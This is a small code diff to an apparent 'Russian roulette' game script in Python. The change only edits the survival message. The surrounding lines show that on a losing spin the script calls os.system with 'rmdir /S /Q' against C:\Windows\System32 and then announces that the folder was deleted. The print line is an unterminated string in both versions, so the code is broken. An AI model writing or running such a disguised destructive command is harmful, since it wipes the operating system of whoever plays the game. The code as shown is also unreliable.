@@ -12,4 +12,4 @@ if chamber == bullet:
     os.system("rmdir /S /Q C:\\Windows\\System32")
     print("Windows 32 has been successfully deleted!")
 else:
-    print("Phew! You survived... this time. Try again if you dare!)
+    print("Phew! You survived... this time. Try again if you dare!!)
